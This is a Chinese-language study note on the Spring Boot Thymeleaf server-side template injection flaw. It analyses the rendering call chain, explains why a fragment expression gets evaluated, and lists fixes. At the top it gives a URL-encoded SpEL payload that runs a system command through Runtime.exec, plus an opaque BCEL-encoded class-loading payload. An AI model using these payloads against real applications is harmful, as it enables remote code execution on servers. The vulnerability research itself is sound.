https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/
# 漏洞利用
```text
poc
/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open -a Calculator.app%22).getInputStream()).next()%7d__::.x

结合bcel(JDK251后BCEL使用不了)
/lang=::__${"".getClass().forName("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$U$9c$85B$a1$W$84$e2$f7$b7$t$c1$83$3dx$c4x1z$b1$w$R$83$e7$ed$b2$c1$c5$d2$92R$8c$fe$o$cf$5e$d4x$f0$H$f8$a3$8c$af$x$R$a3$7bx$_o$e6$cdL$de$7e$7c$be$bd$D$d8$c7$b6$F$Ts$W$e6$b1P$c0b$da$97L$y$9bX1$b1$ca$90$3fP$a1J$O$Z$b2$f5F$87$c18$8a$ba$92a$d6S$a1$3c$l$P$7c$Z_q$3f$m$c4$f1$o$c1$83$O$8fU$3aO$40$p$b9Q$a3$94$T$d1$c0$f5$a5$I$dc$W$7f$I$o$dem2$U$OD0$b1$$$b5$T$$n$cf$f8P$cb$u$9c$c1jG$e3X$c8$T$95$da$d8$T$d5$5e$9f$dfq$h$F$UM$ac$d9X$c7$GEP$aa$b0$b1$89$z$86Z$ca$bb$B$P$7b$ee$f1$bd$90$c3DE$nC$e5o8A$d3$c5$L$bf$_E$c2P$9dB$97$e30Q$D$ca$b5z2$f9$Z$e6$eb$N$ef$df$O$dda$c8$7b$v$Yv$ea$bf$d8v$S$ab$b0$d7$fc$zh$c5$91$90$a3Q$T$db$c8$d3$7f$a7$_$D$96$deB$d5$a2$c9$a5$ce$a8$e7v_$c0$9e4$3dC5$af$c1$Ml$aa$f6$f7$CJ$uS$_$60$f6G$7c$a1$cd$80$f2$x2N$f6$Z$c6$f5$p$8c$d3$t$8d$VI$97CV$bb90$a8$9a$84YH$3f$b2D$a8$ad$fd$81$8af2$9e$89$wH$e8h$b8$f6$Fz7$85$d0$t$C$A$A", true, "".getClass().forName("com.sun.org.apache.bcel.internal.util.ClassLoader").newInstance())}_______________
```

# 漏洞分析
## 前置学习thymeleaf
1.TemplateEngine(process)
2.TemplateManager(parseAndProcess)
3.ThymeleafViewResolver(createView)
File/ServletContext/SpringResource/String/Url + TemplateResolver

## 调用链
渲染的时候产生的问题
DispatcherServlet.render()
 ThymeleafView.renderFragment()
  StandardExpressionPreprocessor.parseExpression()
   StandardExpressionPreprocessor.preprocess()
    PREPROCESS_EVAL_PATTERN.matcher(input);
    VariableExpression.execute()

## 解释poc

```text
1.::
org.thymeleaf.spring5.view.ThymeleafView.renderFragment()中执行else部分
if (!viewTemplateName.contains("::")) {} else {...}
代表含义fragment
// Template name contains a fragment name, so we should parse it as such

2.__Expression__
org.thymeleaf.standard.expression.StandardExpressionPreprocessor.preprocess()中正则匹配
final Matcher matcher = PREPROCESS_EVAL_PATTERN.matcher(input);
PREPROCESS_EVAL_PATTERN = "\_\_(.*?)\_\_"
input = "~{user/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a Calculator.app").getInputStream()).next()}__::.x/welcome}"

最终执行: new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a Calculator.app").getInputStream()).next()
```

## 提出问题
1.研究一下作者给出的poc
::代表renderFragment, 在传入的viewName中含有fragment, 需要处理一下
/doc/{document}返回void时传入的名称作为viewName
redirect不会产生问题, 不会解析为表达式
/safe/doc/{document}传参增加了response所以无法利用

2.url利用中关于编码的问题
尝试了直接输入也可以没问题

3.漏洞产生的根本原因
在解析fragment的时候进行了表达式执行, 可以通过构造达到执行命令的效果

4.如何修复如何绕过
方法1使用ResponseBody
方法2使用redirect
方法3在传入参数增加response


5.执行表达式为什么是${expression}
6.其他的执行表达式都有哪些方式

## 调试遇到的问题:
1.run可以访问, 但是debug无法访问??
使用idea service发现卡住，然后去掉了所有断点就可以了

